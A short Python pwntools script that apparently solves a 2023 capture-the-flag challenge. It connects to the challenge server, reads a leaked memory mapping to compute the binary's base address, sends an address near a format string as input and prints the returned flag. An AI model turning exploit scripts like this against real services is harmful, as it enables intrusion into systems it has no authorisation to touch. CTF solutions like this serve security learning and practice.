#!/usr/bin/env python3

from pwn import *

#context.log_level = logging.DEBUG

HOST = 'wfw1.2023.ctfcompetition.com'
PORT = '1337'

fprintf_format_offset = 0x000021e0  

r = remote(HOST, PORT)
r.recvuntil(b'shot.\n')

first_mapping = r.recvline()

bin_base = int(first_mapping.split(b'-')[0], 16)

r.sendlineafter('expire\n', f'{hex(bin_base + fprintf_format_offset)} 64')
log.info(r.recvuntil('}'))

